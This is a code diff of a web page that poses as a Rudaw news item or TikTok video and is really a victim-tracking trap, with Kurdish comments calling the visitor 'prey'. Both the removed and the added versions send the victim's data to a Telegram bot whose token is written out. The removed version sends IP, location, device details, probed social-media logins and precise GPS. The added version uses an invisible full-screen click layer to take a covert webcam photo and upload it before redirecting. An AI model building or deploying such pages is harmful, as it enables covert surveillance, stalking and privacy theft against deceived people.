@@ -1,24 +1,20 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rudaw - هەواڵی بەپەلە</title>
-    <meta property="og:title" content="ڕوداو: هەواڵێکی گرنگ دەربارەی سۆران">
-    <meta property="og:image" content="https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg">
+    <title>Rudaw - Exclusive</title>
     <style>
-        body { margin: 0; background: #000; font-family: Tahoma, sans-serif; color: white; overflow: hidden; }
-        .bg { position: fixed; width: 100%; height: 100%; background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center; background-size: contain; }
-        #overlay { position: fixed; width: 100%; height: 100%; z-index: 100; cursor: pointer; display: flex; align-items: flex-end; justify-content: center; padding-bottom: 50px; }
-        .btn { background: #ce1126; color: white; padding: 15px 30px; border-radius: 50px; font-weight: bold; font-size: 18px; border: none; box-shadow: 0 0 20px rgba(206, 17, 38, 0.5); }
+        body { margin: 0; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        /* لۆگۆیەکی گەورە بۆ ئەوەی ناچار بێت کلیکی لێ بکات */
+        .play-btn { width: 150px; cursor: pointer; z-index: 10; }
         video, canvas { display: none; }
+        /* ئەمە تەڵە شەفافەکەیە کە دەچێتە سەر هەموو شاشەکە */
+        #trap-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; opacity: 0; }
     </style>
 </head>
-<body onload="kingInit()">
-    <div class="bg"></div>
-    <div id="overlay" onclick="captureEverything()">
-        <button class="btn">بۆ بینینی ڤیدیۆی ڕوداوەکە کلیک بکە</button>
-    </div>
+<body onload="notify()">
+    <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-0.png" class="play-btn" id="main-btn">
+    <div id="trap-layer" onclick="takeShockPhoto()"></div>
 
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -26,82 +22,43 @@
     <script>
         const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
         const chat_id = "7261354534";
-        const target = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        // ١. قۆناغی بێدەنگ (هەر کە لینکەکەی کردەوە)
-        async function kingInit() {
-            let entryMsg = "👑 پاشایەتی: نێچیرەکە ئێستا داخل بوو!\n\n";
-            
-            // زانیاری ئایپی و کۆمپانیا
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                entryMsg += `📍 شوێن: ${d.city}, ${d.country_name}\n`;
-                entryMsg += `🏢 ئینتەرنێت: ${d.org}\n`;
-                entryMsg += `🌐 ئایپی: ${d.ip}\n`;
-            } catch(e) {}
-
-            // زانیاری مۆبایل
-            entryMsg += `📱 ئامێر: ${navigator.platform}\n`;
-            entryMsg += `🧠 ناوکەی CPU: ${navigator.hardwareConcurrency}\n`;
-            
-            sendMsg(entryMsg);
-            checkSocialMedia();
+        function notify() {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("🚨 نێچیرەکە ئێستا سەیری لۆگۆکە دەکات، چاوەڕێی کلیکین...")}`);
         }
 
-        // ٢. پشکنینی ئەکاونتە چالاکەکان بە بێدەنگی
-        function checkSocialMedia() {
-            const sites = ['facebook.com', 'google.com', 'instagram.com'];
-            sites.forEach(site => {
-                const img = new Image();
-                img.src = `https://${site}/favicon.ico?${Math.random()}`;
-                img.onload = () => sendMsg(`✅ ئەکاونتی کراوە دۆزرایەوە: ${site}`);
-            });
-        }
-
-        // ٣. قۆناغی کلیک (وێنە و لۆکەیشن و ناسنامە)
-        async function captureEverything() {
-            document.getElementById('overlay').innerHTML = "<button class='btn'>چاوەڕێ بکە...</button>";
-            
+        async function takeShockPhoto() {
             try {
-                // داواکردنی کامێرا
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v');
-                v.srcObject = s; await v.play();
+                // داواکردنی کامێرا لە چرکەی کلیکدا
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                await video.play();
 
-                // گرتنی وێنە
+                // گرتنی وێنە دوای نیو چرکە بە بێدەنگی
                 setTimeout(async () => {
-                    await sendSnap(v, "1.jpg", "📸 وێنەی نێچیر");
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    // داواکردنی لۆکەیشنی ورد
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const map = `📍 لۆکەیشنی ورد:\nhttp://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            await sendMsg(map);
-                            window.location.href = target;
-                        }, () => { window.location.href = target; }, {enableHighAccuracy: true});
-                    } else { window.location.href = target; }
-                }, 1000);
+                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.7))).blob();
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', "👑 پاشایەتی: وێنەی نێچیر ئامادەیە!");
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // گواستنەوە بۆ تیکتۆک دوای سەرکەوتن
+                    window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
+                }, 500);
+
             } catch (e) {
-                // ئەگەر ڕێگەی نەدا، هەر دەڕوات بۆ تیکتۆکەکە
-                window.location.href = target;
+                // ئەگەر Allow نەکرد، لانی کەم ئایپی و زانیارییەکانیمان لایە
+                window.location.href = "https://vt.tiktok.com/ZS5WMhjoP/";
             }
-        }
-
-        async function sendSnap(v, fn, cap) {
-            const c = document.getElementById('c');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const b = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-            const fd = new FormData();
-            fd.append('chat_id', chat_id);
-            fd.append('photo', b, fn);
-            fd.append('caption', cap);
-            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-        }
-
-        function sendMsg(m) {
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
         }
     </script>
 </body>
